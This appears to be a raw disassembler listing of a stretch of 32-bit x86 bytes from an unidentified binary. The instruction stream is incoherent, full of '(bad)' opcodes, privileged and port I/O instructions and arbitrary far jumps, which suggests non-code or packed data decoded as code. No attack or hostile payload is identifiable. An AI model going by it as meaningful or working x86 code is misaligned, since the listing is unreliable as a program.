  417121:	imul   edx,DWORD PTR [ecx],0xc0944550
  417127:	adc    al,0x5c
  417129:	mov    edi,0x61a0cdea
  41712e:	aas    
  41712f:	ja     0x417176
  417131:	jo     0x4170bc
  417133:	mov    eax,0x63b85d94
  417138:	test   al,0xe5
  41713a:	sub    eax,0x8205b545
  41713f:	jp     0x41710f
  417141:	mov    ch,0xaa
  417143:	and    eax,0x8647059
  417148:	mov    ds:0xb077d593,eax
  41714d:	mov    ch,0x66
  41714f:	mov    esp,0x5c1e89c
  417154:	dec    ecx
  417155:	xchg   ecx,eax
  417156:	xchg   al,al
  417158:	loop   0x417131
  41715a:	mov    esi,0x89bd22da
  41715f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417160:	mov    DWORD PTR [edi+ebp*2+0x4f],edx
  417164:	dec    ebp
  417165:	sti    
  417166:	add    DWORD PTR [ebx-0x46],0xf721ecf9
  41716d:	inc    esi
  41716e:	mov    ebx,DWORD PTR [ebx+edi*8-0xb3ad0d7]
  417175:	jg     0x4171b6
  417177:	mov    ecx,0x4e12aac4
  41717c:	lods   al,BYTE PTR ds:[esi]
  41717d:	pop    esp
  41717e:	ss push edx
  417180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417181:	js     0x41713d
  417183:	popf   
  417184:	sar    DWORD PTR [ecx+0x4e],cl
  417187:	fdivr  DWORD PTR [eax]
  417189:	pop    ss
  41718a:	inc    esi
  41718b:	cmp    bh,BYTE PTR [edi]
  41718d:	aas    
  41718e:	and    edx,DWORD PTR [edx]
  417190:	retf   0xda16
  417193:	push   edi
  417194:	stos   BYTE PTR es:[edi],al
  417195:	mov    edx,0x7a471bf8
  41719a:	add    DWORD PTR [ecx-0x3f],edx
  41719d:	ret    0x9c25
  4171a0:	xor    DWORD PTR [edx],esi
  4171a2:	mov    ds:0xd703e82c,eax
  4171a7:	dec    esi
  4171a8:	mov    WORD PTR [eax+esi*4],?
  4171ab:	(bad)  
  4171ad:	or     DWORD PTR [ebx-0x377332dd],ebx
  4171b3:	sar    esp,0x12
  4171b6:	(bad)  
  4171b7:	dec    esp
  4171b8:	add    al,0x65
  4171ba:	jb     0x41715f
  4171bc:	xchg   DWORD PTR [esi],ecx
  4171be:	loope  0x41719d
  4171c0:	sbb    eax,0x8f4f09ca
  4171c5:	adc    DWORD PTR [ebx+edx*4],eax
  4171c8:	pop    ss
  4171c9:	aaa    
  4171ca:	or     ch,BYTE PTR [edi]
  4171cc:	xchg   ebx,eax
  4171cd:	fs psubusw mm0,mm3
  4171d1:	dec    esi
  4171d2:	and    eax,0x4e8faf4b
  4171d7:	sub    edi,DWORD PTR [ebx+0x71]
  4171da:	dec    al
  4171dc:	push   esp
  4171dd:	push   esi
  4171de:	add    ch,cl
  4171e0:	push   ecx
  4171e1:	call   0xd15b:0x84ca3558
  4171e8:	shr    BYTE PTR [ebx],0x75
  4171eb:	pop    esi
  4171ec:	cmp    BYTE PTR [edx+0x7198c703],ch
  4171f2:	stc    
  4171f3:	sub    BYTE PTR [ebx-0x6],0x4f
  4171f7:	xor    eax,0x2e30f5e9
  4171fc:	iret   
  4171fd:	push   cs
  4171fe:	sti    
  4171ff:	shl    BYTE PTR ds:0x8e0f89ea,cl
  417205:	pop    edi
  417206:	fwait
  417207:	fwait
  417208:	in     al,0xa7
  41720a:	sbb    al,0xad
  41720c:	shl    BYTE PTR [edi],cl
  41720e:	pushf  
  41720f:	test   al,0xc5
  417211:	jmp    0x9ea67cd0
  417216:	pop    eax
  417217:	(bad)  
  417218:	jmp    0x2c52:0xa862a5de
  41721f:	jne    0x417279
  417221:	fiadd  WORD PTR [ecx]
  417223:	scas   eax,DWORD PTR es:[edi]
  417224:	sub    DWORD PTR [edi-0x48c20137],0xa3ac2532
  41722e:	aad    0x1
  417230:	and    al,0x9d
  417232:	mov    WORD PTR ds:0x86f3d2f3,ds
  417238:	out    dx,al
  417239:	jmp    0x4172b1
  41723b:	add    eax,0xffd8a82c
  417240:	lea    edi,[edi]
  417242:	cmp    bl,cl
  417244:	popf   
  417245:	pushf  
  417246:	mov    dh,0x67
  417248:	daa    
  417249:	sbb    al,0xa8
  41724b:	sub    eax,0x97a51483
  417250:	enter  0x21,0x9d
  417254:	lock test eax,0xf0c2f21a
  41725a:	push   eax
  41725b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41725c:	jp     0x4172a7
  41725e:	nop
  41725f:	sar    BYTE PTR [eax],1
  417261:	xchg   esp,eax
  417262:	jle    0x4172d0
  417264:	dec    esp
  417265:	sub    bh,BYTE PTR [ebp-0x196130fb]
  41726b:	mov    ah,0x5a
  41726d:	cmp    ch,ch
  41726f:	fstp   QWORD PTR [ebx-0x12]
  417272:	push   esp
  417273:	ret    0x192a
  417276:	in     al,dx
  417277:	jno    0x417269
  417279:	and    eax,0x4d64b611
  41727e:	or     bh,BYTE PTR [ebx]
  417280:	jg     0x417261
  417282:	add    DWORD PTR [ebp+0x9736696],esi
  417288:	and    ebx,DWORD PTR [edx]
  41728a:	cld    
  41728b:	mov    eax,eax
  41728d:	leave  
  41728e:	adc    al,0x72
  417290:	mov    ds:0x315b41e9,eax
  417295:	push   edx
  417296:	add    DWORD PTR [ebx+0x4f],edx
  417299:	dec    ebx
  41729a:	xor    DWORD PTR [ecx+0x7e],0xbc1c8986
  4172a1:	inc    ecx
  4172a2:	xchg   DWORD PTR gs:[esi-0x9fa50f4],ecx
  4172a9:	test   BYTE PTR [ebx],dh
  4172ab:	loop   0x4172da
  4172ad:	mov    ch,0x55
  4172af:	and    eax,DWORD PTR [ebp+0x39]
  4172b2:	xor    eax,0x7cafa50e
  4172b7:	mov    ecx,0xbcdb7ed7
  4172bc:	sar    ebp,0x76
  4172bf:	pop    ss
  4172c0:	xchg   esi,eax
  4172c1:	push   esi
  4172c2:	in     al,0x9
  4172c4:	inc    edi
  4172c5:	inc    eax
  4172c6:	test   eax,0xa015ba6a
  4172cb:	aam    0x81
  4172cd:	fidiv  DWORD PTR [ebp-0x4160b519]
  4172d3:	adc    BYTE PTR [di-0x66cf],ah
  4172d8:	add    eax,0x659c014b
  4172dd:	dec    edx
  4172de:	imul   eax,DWORD PTR [edx+edi*8],0x14bd7a9e
  4172e5:	out    dx,al
  4172e6:	cmp    BYTE PTR [ebx],bh
  4172e8:	shr    BYTE PTR [esi-0x17b6e671],1
  4172ee:	pushf  
  4172ef:	mov    edx,DWORD PTR [ecx-0x22b2714]
  4172f5:	cmp    dl,BYTE PTR [edi]
  4172f7:	ins    BYTE PTR es:[edi],dx
  4172f8:	(bad)  
  4172f9:	pop    eax
  4172fa:	or     al,0x5d
  4172fc:	push   edi
  4172fd:	jmp    0x2965400f
  417302:	int3   
  417303:	in     eax,dx
  417304:	pop    esi
  417305:	jbe    0x4172f2
  417307:	cmp    cl,BYTE PTR [eax+eiz*8+0x5dbb5f77]
  41730e:	xchg   ebx,eax
  41730f:	jmp    0xf2a:0x89394f36
  417316:	loope  0x4172c1
  417318:	dec    esp
  417319:	int    0xa4
  41731b:	shl    DWORD PTR [ecx+0x35],0x47
  41731f:	cmp    DWORD PTR [edi-0x7],ebp
  417322:	pop    ebx
  417323:	inc    esi
  417324:	scas   al,BYTE PTR es:[edi]
  417325:	add    cl,BYTE PTR [ebx-0x2d]
  417328:	cvtpi2ps xmm2,QWORD PTR [ecx-0x71]
  41732c:	imul   DWORD PTR [eax-0x3a3c31c]
  417332:	stc    
  417333:	(bad)  
  417334:	in     al,dx
  417335:	sar    edi,1
  417337:	mov    esi,0xabffffd7
  41733c:	cmp    BYTE PTR [ecx+esi*2-0x1d],0x53
  417341:	push   eax
  417342:	dec    esi
  417343:	and    esi,DWORD PTR [ecx+0x3f]
  417346:	adc    BYTE PTR [eax+0x8],bl
  417349:	fnstcw WORD PTR [ebp+0x1]
  41734c:	lods   eax,DWORD PTR ds:[esi]
  41734d:	inc    ebp
  41734e:	scas   eax,DWORD PTR es:[edi]
  41734f:	jne    0x4172dc
  417351:	mov    esp,0xb56a26fc
  417356:	mov    BYTE PTR [edx+0x5ede2d1c],ch
  41735c:	into   
  41735d:	imul   ebp,DWORD PTR [eax],0x28d461eb
  417363:	mov    ebx,0x9353cd22
  417368:	sbb    al,0xca
  41736a:	loopne 0x41731a
  41736c:	ret    0x4613
  41736f:	(bad)  
  417370:	and    BYTE PTR [edx-0x244e2d8c],0xaf
  417377:	sar    DWORD PTR [ebx-0x42],cl
  41737a:	xchg   BYTE PTR [esi],dl
  41737c:	mov    al,ch
  41737e:	xchg   esi,eax
  41737f:	add    edx,DWORD PTR [ecx*1-0x60c7f1fb]
  417386:	xchg   edx,eax
  417387:	adc    al,bh
  417389:	add    al,0xd8
  41738b:	je     0x4173e0
  41738d:	xchg   esi,eax
  41738e:	cmp    BYTE PTR [edi],cl
  417390:	ret    0xd633
  417393:	sbb    DWORD PTR [ecx+0x66],ecx
  417396:	ds push esp
  417398:	mov    bh,0x0
  41739a:	cmp    eax,0x51a853f5
  41739f:	pop    esi
  4173a0:	inc    ebp
  4173a1:	outs   dx,DWORD PTR ds:[esi]
  4173a2:	sar    DWORD PTR [esi],1
  4173a4:	ficomp WORD PTR [esi+0x187de9ba]
  4173aa:	into   
  4173ab:	stos   DWORD PTR es:[edi],eax
  4173ac:	mov    bh,0x4d
  4173ae:	(bad)  
  4173af:	stos   DWORD PTR es:[edi],eax
  4173b0:	or     ecx,ebp
  4173b2:	mov    WORD PTR [ebx],fs
  4173b4:	outs   dx,DWORD PTR ds:[esi]
  4173b5:	mov    ecx,0x9a08ef8e
  4173ba:	cmp    bl,BYTE PTR [ebx-0x50]
  4173bd:	shl    BYTE PTR [edx-0x3b],0x5a
  4173c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4173c2:	les    ebx,FWORD PTR [edx-0x586d6ff]
  4173c8:	xchg   ebp,eax
  4173c9:	or     al,0x73
  4173cb:	and    ah,ah
  4173cd:	ret    
  4173ce:	xchg   edi,eax
  4173cf:	cld    
  4173d0:	pop    esi
  4173d1:	lock pop ebp
  4173d3:	ret    
  4173d4:	fdivr  st(1),st
  4173d6:	push   0x4d
  4173d8:	mov    ch,0xe9
  4173da:	mov    ds:0x39bc141,eax
  4173df:	mov    eax,ds:0x407e2e7a
  4173e4:	xchg   ebp,eax
  4173e5:	stos   BYTE PTR es:[edi],al
  4173e6:	pop    edi
  4173e7:	xchg   esi,eax
  4173e8:	ret    
  4173e9:	xor    bl,BYTE PTR [ebp+edi*2-0x5b]
  4173ed:	retf   
  4173ee:	fwait
  4173ef:	cmp    al,0x13
  4173f1:	mov    ah,BYTE PTR [edx]
  4173f3:	js     0x41741d
  4173f5:	and    DWORD PTR [ecx+0x35],0xec623936
  4173fc:	retf   
  4173fd:	cmp    DWORD PTR [edx-0x7803436b],ebp
  417403:	outs   dx,DWORD PTR ds:[esi]
  417404:	mov    ah,0x97
  417406:	out    0x33,ax
  417409:	mov    eax,0xead4064a
  41740e:	fstp   DWORD PTR [ecx]
  417410:	test   al,0x21
  417412:	mov    BYTE PTR [eax],al
  417414:	push   ecx
  417415:	pop    edi
  417416:	cmp    ebx,DWORD PTR [ebx]
  417418:	dec    esi
  417419:	xlat   BYTE PTR ds:[ebx]
  41741a:	imul   ebx,DWORD PTR [esi-0x724f72b7],0xbdbdc5ff
  417424:	popf   
  417425:	inc    ebx
  417426:	pop    esi
  417427:	test   al,0xac
  417429:	jecxz  0x41741b
  41742b:	and    al,0xf0
  41742d:	inc    ebx
  41742e:	lea    ebp,[esi]
  417430:	mov    DWORD PTR [edx],eax
  417432:	add    al,0xe7
  417434:	push   ds
  417435:	mov    bl,0xb8
  417437:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417438:	sbb    al,0xd7
  41743a:	lock es push eax
  41743d:	sbb    al,ch
  41743f:	out    0xb,al
  417441:	mov    BYTE PTR [eax],0x80
  417444:	pop    ecx
  417445:	icebp  
  417446:	sbb    eax,0xe35fa740
  41744b:	popf   
  41744c:	or     DWORD PTR [ebx+ebp*4-0x7d],ecx
  417450:	ss pop esp
  417452:	stc    
  417453:	daa    
  417454:	cld    
  417455:	or     eax,0xe2652a8c
  41745a:	(bad)  
  41745b:	out    dx,al
  41745c:	retf   0x5df5
  41745f:	xchg   edx,eax
  417460:	retf   
  417461:	xor    eax,0x8348e83
  417466:	or     BYTE PTR [edi],0x1e
  417469:	and    al,0x10
  41746b:	add    dh,BYTE PTR [esi]
  41746d:	mov    ch,BYTE PTR [ecx]
  41746f:	add    eax,0x8bbd9758
  417474:	iret   
  417475:	sbb    eax,0x5f38ffc6
  41747a:	xchg   bh,dl
  41747c:	mov    al,ds:0xb34aacdb
  417481:	call   FWORD PTR [ecx-0x2e]
  417484:	xchg   edi,eax
  417485:	cdq    
  417486:	addr16 nop
  417488:	sbb    DWORD PTR ds:0xf4015b8b,edx
  41748e:	ret    
  41748f:	jmp    0x2442:0xbc66e96d
  417496:	cmp    eax,ecx
  417498:	dec    ebp
  417499:	shr    BYTE PTR ds:0xe3526c0f,0x25
  4174a0:	fdiv   QWORD PTR [edi+0x5e]
  4174a3:	mov    BYTE PTR [ebp+0x64c84241],bl
  4174a9:	push   ecx
  4174aa:	retf   0xc8fa
  4174ad:	or     DWORD PTR [edx],ebp
  4174af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174b0:	popa   
  4174b1:	test   DWORD PTR [eax-0x4],0xb5ebb31c
  4174b8:	or     dl,ch
  4174ba:	push   0x4f
  4174bc:	or     BYTE PTR [ebp+0x2b],0x4e
  4174c0:	inc    ebp
  4174c2:	jge    0x41746f
  4174c4:	clc    
  4174c5:	add    eax,0xdb5197e6
  4174ca:	scas   al,BYTE PTR es:[edi]
  4174cb:	jecxz  0x417503
  4174cd:	mov    ch,0xa
  4174cf:	stc    
  4174d0:	bound  eax,QWORD PTR [edi]
  4174d2:	xor    al,0xe0
  4174d4:	fisub  WORD PTR [ebx]
  4174d6:	add    bh,dh
  4174d8:	clc    
  4174d9:	in     eax,dx
  4174da:	jmp    0x8023:0xf4f0a545
  4174e1:	and    cl,dl
  4174e3:	pusha  
  4174e4:	jmp    0x2f34:0xc472c0e3
  4174eb:	outs   dx,DWORD PTR ds:[esi]
  4174ec:	mov    ds:0x7d142a82,al
  4174f1:	loop   0x417498
  4174f3:	and    ch,BYTE PTR [eax-0x3c]
  4174f6:	arpl   bx,ax
  4174f8:	pop    eax
  4174f9:	xor    bh,BYTE PTR [ecx]
  4174fb:	cli    
  4174fc:	jecxz  0x417571
  4174fe:	leave  
  4174ff:	cmp    eax,0xfed83b64
  417504:	pop    esp
  417505:	lods   eax,DWORD PTR ds:[esi]
  417506:	mov    eax,ds:0xbaa3efa
  41750b:	push   ds
  41750c:	or     eax,0x151c4a4e
  417511:	dec    edx
  417512:	jae    0x4174e9
  417514:	fmul   DWORD PTR [ecx-0x30c796b7]
  41751a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41751b:	sub    esp,eax
  41751d:	les    edx,FWORD PTR [ebx+0x17d0c27]
  417523:	rcl    DWORD PTR [edx-0x718e5939],cl
  417529:	cwde   
  41752a:	mov    ch,0x4b
  41752c:	mov    bl,0xf9
  41752e:	and    ebp,edx
  417530:	jge    0x417540
  417532:	or     esp,DWORD PTR [edi]
  417534:	lahf   
  417535:	sti    
  417536:	and    bh,BYTE PTR [edi]
  417538:	aaa    
  417539:	ret    0x1ad1
  41753c:	mov    ch,BYTE PTR [esi-0x5c878d47]
  417542:	mov    edx,0x6ea1f77a
  417547:	inc    edx
  417548:	loopne 0x417575
  41754a:	sub    BYTE PTR [ecx+0x33],0xda
  41754e:	fs dec eax
  417550:	rol    BYTE PTR [ebx],cl
  417552:	hlt    
  417553:	test   al,0x53
  417555:	sbb    eax,0x84d465fe
  41755a:	sbb    DWORD PTR [edx],edx
  41755c:	loopne 0x417516
  41755e:	aad    0x62
  417560:	mov    eax,0xf97385df
  417565:	mov    cl,0xd1
  417567:	pushf  
  417568:	ja     0x417592
  41756a:	cmc    
  41756b:	call   0x29e13376
  417570:	push   ebp
  417571:	mov    eax,0x45c3b0f
  417576:	in     al,dx
  417577:	jb     0x4174ff
  417579:	out    0x94,al
  41757b:	adc    esp,DWORD PTR [esi+0x2b5c90bf]
  417581:	inc    ebx
  417582:	test   DWORD PTR [ecx+esi*8-0x25],esp
  417586:	jbe    0x4175fe
  417588:	les    ecx,FWORD PTR [esi]
  41758a:	cld    
  41758b:	mov    edx,0x4a805c0f
  417590:	(bad)  
  417591:	shr    ebp,cl
  417593:	mov    bl,0xc1
  417595:	das    
  417596:	adc    BYTE PTR [edi-0xb],bl
  417599:	xchg   ebp,eax
  41759a:	add    edx,edi
  41759c:	hlt    
  41759d:	lds    esp,FWORD PTR [edx]
  41759f:	push   ds
  4175a0:	pop    ecx
  4175a1:	or     BYTE PTR ds:0xa15af273,ch
  4175a7:	stos   BYTE PTR es:[edi],al
  4175a8:	mov    ebp,0x20958303
  4175ad:	inc    esp
  4175af:	sar    ah,cl
  4175b1:	xor    al,BYTE PTR [edi+0x5f]
  4175b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175b5:	mov    dh,0x3d
  4175b7:	sub    al,0x14
  4175b9:	clc    
  4175ba:	out    0xd8,al
  4175bc:	std    
  4175bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175be:	inc    edx
  4175bf:	(bad)  
  4175c0:	jno    0x417612
  4175c2:	aam    0xa6
  4175c4:	sar    esi,1
  4175c6:	sbb    DWORD PTR [edi-0x19],ebp
  4175c9:	sbb    al,dh
  4175cb:	mov    DWORD PTR [edx+ebx*2],edi
  4175ce:	sbb    bl,BYTE PTR [esi-0x65]
  4175d1:	inc    ebp
  4175d2:	jecxz  0x417640
  4175d4:	(bad)  
  4175d5:	mov    al,ds:0x265a4b1b
  4175da:	(bad)  es:[ecx-0x40]
  4175de:	or     eax,0x21
  4175e1:	in     eax,0x83
  4175e3:	icebp  
  4175e4:	jg     0x4175f5
  4175e6:	es push edx
  4175e8:	mov    BYTE PTR [ebx-0x7d],bl
  4175eb:	call   0x5547:0x17460ee5
  4175f2:	sahf   
  4175f3:	aad    0xe2
  4175f5:	out    dx,eax
  4175f6:	and    eax,0x41a6f7d3
  4175fb:	jbe    0x41758f
  4175fd:	bnd jne 0x41762d
  417600:	fs sub ebp,ebx
  417603:	out    0x0,eax
  417605:	xor    DWORD PTR [eax-0x2b],ecx
  417608:	das    
  417609:	stos   DWORD PTR es:[edi],eax
  41760a:	jecxz  0x417639
  41760c:	xor    esi,DWORD PTR [eax+eiz*1-0x28bdb0e0]
  417613:	and    BYTE PTR [edi+eiz*1-0xda9c57b],bh
  41761a:	rsm    
  41761c:	mov    eax,0xab1016d6
  417621:	sub    DWORD PTR [ecx],esp
  417623:	out    dx,al
  417624:	add    DWORD PTR [ebx+0x7d2add3f],ecx
  41762a:	push   0xffffff80
  41762c:	mov    WORD PTR [ebx+edi*1-0x19],?
  417630:	jmp    0x77db:0x3933319c
  417637:	hlt    
  417638:	adc    DWORD PTR [esp+edi*1-0x1ba57db4],eax
  41763f:	in     al,dx
  417640:	cmp    al,0x91
  417642:	sub    BYTE PTR [edi-0x7ee2e5fc],0x7e
  417649:	(bad)  
  41764a:	sub    DWORD PTR [eax+0x29],ebp
  41764d:	(bad)  
  41764e:	imul   edi,DWORD PTR [eax-0x53a20eb],0x560e88cc
  417658:	jmp    0xeb7a73a6
  41765d:	in     al,0x30
  41765f:	pop    ss
  417660:	fnsave [eax-0x26344b94]
  417666:	fsub   DWORD PTR [eax]
  417668:	adc    esp,edi
  41766a:	or     DWORD PTR [ebp-0x6],ebp
  41766d:	test   BYTE PTR [edx+0x5cb82d0b],dh
  417673:	scas   al,BYTE PTR es:[edi]
  417674:	lods   al,BYTE PTR ds:[esi]
  417675:	in     al,0x21
  417677:	mov    ebp,ebx
  417679:	and    DWORD PTR [ebx+0x42],esp
  41767c:	push   ss
  41767d:	loopne 0x417615
  41767f:	ret    
  417680:	gs test bl,bl
  417683:	js     0x4176fe
  417685:	imul   edx,DWORD PTR [ebx],0x7
  417688:	xchg   esi,eax
  417689:	in     al,dx
  41768a:	(bad)  
  41768b:	repz inc ebp
  41768d:	call   0xd457:0xd3009393
  417694:	pop    esi
  417695:	dec    ebx
  417696:	jmp    0x417671
  417698:	mov    bh,BYTE PTR [edx+ecx*1+0x342105ed]
  41769f:	aas    
  4176a0:	adc    DWORD PTR [esi+0x4dbf75f8],ebx
  4176a6:	mov    dl,0x5
  4176a8:	retf   0x7ca9
  4176ab:	call   0xf05a0010
  4176b0:	mov    esi,0x885ec47f
  4176b5:	cld    
  4176b6:	sbb    esi,DWORD PTR [edx-0x1b]
  4176b9:	sbb    al,0x15
  4176bb:	pop    ebx
  4176bc:	inc    edx
  4176bd:	fld    TBYTE PTR [ebp+0x11]
  4176c0:	fimul  DWORD PTR [eax-0xe7e8fb1]
  4176c6:	inc    ebp
  4176c7:	icebp  
  4176c8:	hlt    
  4176c9:	push   eax
  4176ca:	mov    dl,0x32
  4176cc:	fwait
  4176cd:	out    dx,al
  4176ce:	inc    edx
  4176cf:	push   ds
  4176d0:	sar    dl,0x1c
  4176d3:	jmp    0x979dd089
  4176d8:	(bad)  
  4176d9:	inc    ecx
  4176da:	push   edi
  4176db:	xchg   ebx,eax
  4176dc:	clc    
  4176dd:	xchg   ch,ah
  4176df:	out    dx,al
  4176e0:	loopne 0x41767f
  4176e2:	scas   eax,DWORD PTR es:[edi]
  4176e3:	(bad)  
  4176e4:	mov    bl,0x0
  4176e6:	popf   
  4176e7:	stc    
  4176e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176e9:	stc    
  4176ea:	push   esp
  4176eb:	pop    es
  4176ec:	ja     0x4176cd
  4176ee:	scas   eax,DWORD PTR es:[edi]
  4176ef:	and    eax,0x15aa344a
  4176f4:	(bad)
  4176f8:	jp     0x4176cf
  4176fa:	dec    ebx
  4176fb:	jl     0x417727
  4176fd:	test   eax,0xf99475f
  417702:	add    BYTE PTR [edi+0x4b],0xa6
  417706:	out    0xc8,eax
  417708:	jo     0x417759
  41770a:	dec    eax
  41770b:	or     al,0x97
  41770d:	(bad)  
  41770f:	in     eax,0xbb
  417711:	jecxz  0x41775d
  417713:	dec    ebx
  417714:	and    edx,DWORD PTR [edx]
  417716:	ins    BYTE PTR es:[edi],dx
  417717:	scas   eax,DWORD PTR es:[edi]
  417718:	cmp    al,0x5f
  41771a:	sub    DWORD PTR [esi+ebp*1+0x589a58e4],0x5650c20a
  417725:	add    al,0x98
  417727:	add    eax,0x12c73bcc
  41772c:	sti    
  41772d:	push   esp
  41772e:	into   
  41772f:	daa    
  417730:	mov    ah,0x80
  417732:	pop    esi
  417733:	sub    eax,0x1c5f606d
  417738:	mov    esp,0xf5ae67a9
  41773d:	adc    DWORD PTR [eax],ecx
  41773f:	stos   DWORD PTR es:[edi],eax
  417740:	pop    edx
  417741:	mov    dh,0xae
  417743:	pop    eax
  417744:	je     0x417798
  417746:	adc    al,0x5d
  417748:	stc    
  417749:	test   BYTE PTR [ebx+0x21],bl
  41774c:	outs   dx,BYTE PTR ds:[esi]
  41774d:	sbb    ah,ch
  41774f:	xor    al,0x32
  417751:	xchg   esi,eax
  417752:	push   edi
  417753:	xchg   ebx,eax
  417754:	ja     0x417757
  417756:	and    al,0x50
  417758:	pusha  
  417759:	push   0x2870ca5d
  41775e:	fisttp DWORD PTR [eax]
  417760:	out    dx,al
  417761:	dec    esi
  417762:	and    eax,ebp
  417764:	dec    esp
  417765:	int3   
  417766:	mov    dh,BYTE PTR [ebp-0x1b]
  417769:	mov    ebx,0x7c1b2c38
  41776e:	sbb    bh,bh
  417770:	xchg   esp,eax
  417771:	(bad)  
  417772:	xchg   esi,eax
  417773:	xchg   ecx,eax
  417774:	sub    BYTE PTR [esi],bh
  417776:	je     0x4176f8
  417778:	call   0x95f0:0xda5263ad
  41777f:	dec    edx
  417780:	xchg   ecx,eax
  417781:	cmp    ebp,DWORD PTR [esi]
  417783:	addr16 inc ecx
  417785:	nop
  417786:	adc    DWORD PTR [edx-0x35],0x44
  41778a:	xor    edi,DWORD PTR [edx]
  41778c:	xor    dh,cl
  41778e:	mov    dl,0xf7
  417790:	fldenv [ecx+0x12becf18]
  417796:	clc    
  417797:	out    0x3a,eax
  417799:	push   0x6e
  41779b:	jmp    0x41776e
  41779d:	in     al,0x68
  41779f:	ins    DWORD PTR es:[edi],dx
  4177a0:	mov    cl,0xaf
  4177a2:	sbb    DWORD PTR [ebp+ebp*1+0x40a6bdd],eax
  4177a9:	stos   DWORD PTR es:[edi],eax
  4177aa:	jl     0x417784
  4177ac:	fisttp QWORD PTR [ebx+0xb]
  4177af:	sbb    ebx,DWORD PTR [edx+eax*1]
  4177b2:	fidiv  DWORD PTR ds:0x6d10532b
  4177b8:	jae    0x41781d
  4177ba:	sub    DWORD PTR [edx],ebp
  4177bc:	div    DWORD PTR [eax]
  4177be:	jg     0x4177b8
  4177c0:	jl     0x417821
  4177c2:	retf   0x43be
  4177c5:	out    0xc6,al
  4177c7:	in     al,dx
  4177c8:	xor    al,0x34
  4177ca:	mov    ebx,0xd7871089
  4177cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177d0:	jecxz  0x417839
  4177d2:	xchg   edi,eax
  4177d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177d4:	test   BYTE PTR [eax-0x37fa8893],dh
  4177da:	es enter 0x54c5,0xce
  4177df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177e0:	push   eax
  4177e1:	cld    
  4177e2:	ret    0x661d
  4177e5:	leave  
  4177e6:	mov    DWORD PTR [eax+0x3a380677],esi
  4177ec:	repnz add DWORD PTR [ebp-0x68fb82e8],ebp
  4177f3:	ret    
  4177f4:	push   ds
  4177f5:	bound  edx,QWORD PTR [eax+0x73c20e84]
  4177fb:	int3   
  4177fc:	push   ebx
  4177fd:	push   cs
  4177fe:	sbb    dh,BYTE PTR [edx-0x1f2a6ccf]
  417804:	(bad)  
  417805:	xchg   esi,eax
  417806:	pop    es
  417807:	adc    BYTE PTR [ecx+0x77],0x67
  41780b:	or     ch,BYTE PTR [ebx]
  41780d:	pop    ebp
  41780e:	aas    
  41780f:	fwait
  417810:	and    dl,BYTE PTR [edx]
  417812:	cs dec ebx
  417814:	jno    0x4177e0
  417816:	aam    0xa7
  417818:	out    dx,eax
  417819:	jmp    0xde4d:0x77c4138e
  417820:	sbb    dl,BYTE PTR [ebp+0x1e]
  417823:	inc    edx
  417824:	xor    al,0xfe
  417826:	sub    bl,BYTE PTR [ecx]
  417828:	ins    BYTE PTR es:[edi],dx
  417829:	add    al,BYTE PTR [edx+0x6b]
  41782c:	daa    
  41782d:	jmp    0xc4298bb
  417832:	jo     0x41788d
  417834:	xchg   edi,eax
  417835:	cmp    ch,BYTE PTR [eax-0x168cd4c0]
  41783b:	jnp    0x41780d
  41783d:	sub    bl,BYTE PTR [eax]
  41783f:	or     edi,DWORD PTR [ecx+0x2e]
  417842:	std    
  417843:	push   ecx
  417844:	(bad)  
  417845:	cli    
  417846:	and    DWORD PTR ds:0xf60554d6,ebp
  41784c:	cmp    esp,DWORD PTR [ebx-0x52]
  41784f:	and    al,BYTE PTR ds:0x6795cd81
  417855:	rol    ebx,cl
  417857:	(bad)  
  417858:	in     al,dx
  417859:	sub    eax,0xd5b74717
  41785e:	ins    BYTE PTR es:[edi],dx
  41785f:	push   0x987c7bc
  417864:	mov    dl,0x72
  417866:	addr16 jb 0x41789c
  417869:	dec    edx
  41786a:	pop    ecx
  41786b:	loop   0x41784b
  41786d:	in     eax,dx
  41786e:	icebp  
  41786f:	xchg   BYTE PTR [ecx-0x6],bl
  417872:	push   ecx
  417873:	fucomi st,st(3)
  417875:	cli    
  417876:	xchg   esi,eax
  417877:	fsub   QWORD PTR [edx-0x2aab5462]
  41787d:	(bad)  
  41787e:	sti    
  41787f:	mov    gs,ax
  417882:	loop   0x41788f
  417884:	mov    ecx,0xba0deafd
  417889:	ret    0x8762
  41788c:	jne    0x41785e
  41788e:	and    DWORD PTR [edi],edi
  417890:	test   eax,0x7f34c0e2
  417895:	sub    eax,0xa9d03feb
  41789a:	or     BYTE PTR [ebp-0x32f09ace],ah
  4178a0:	jo     0x417875
  4178a2:	icebp  
  4178a3:	inc    esp
  4178a4:	jecxz  0x4178da
  4178a6:	xor    eax,eax
  4178a8:	ins    BYTE PTR es:[edi],dx
  4178a9:	fld    DWORD PTR [edx-0x59c89514]
  4178af:	clc    
  4178b0:	je     0x41788f
  4178b2:	(bad)  
  4178b3:	jb     0x417842
  4178b5:	(bad)  
  4178b6:	jb     0x417861
  4178b8:	jmp    0x4f313cc5
  4178bd:	adc    BYTE PTR [ebp+0x3e1ca99b],bh
  4178c3:	retf   
  4178c4:	movhps QWORD PTR [edx],xmm4
  4178c7:	xchg   BYTE PTR gs:[ebx+0xde9982c],dl
  4178ce:	mov    dl,0x2b
  4178d0:	loope  0x4178fb
  4178d2:	cmp    al,0xef
  4178d4:	jle    0x41791b
  4178d6:	dec    ebp
  4178d7:	add    al,0x8b
  4178d9:	popf   
  4178da:	mov    eax,ds:0xac9c3060
  4178df:	mov    ebx,0x9ebd41da
  4178e4:	inc    ebp
  4178e5:	jno    0x4178b5
  4178e7:	xchg   esi,eax
  4178e8:	mov    edx,edi
  4178ea:	into   
  4178eb:	mov    BYTE PTR gs:[edi-0xb],dl
  4178ef:	cli    
  4178f0:	pop    ds
  4178f1:	fist   DWORD PTR [esi+0x49]
  4178f4:	pop    ebx
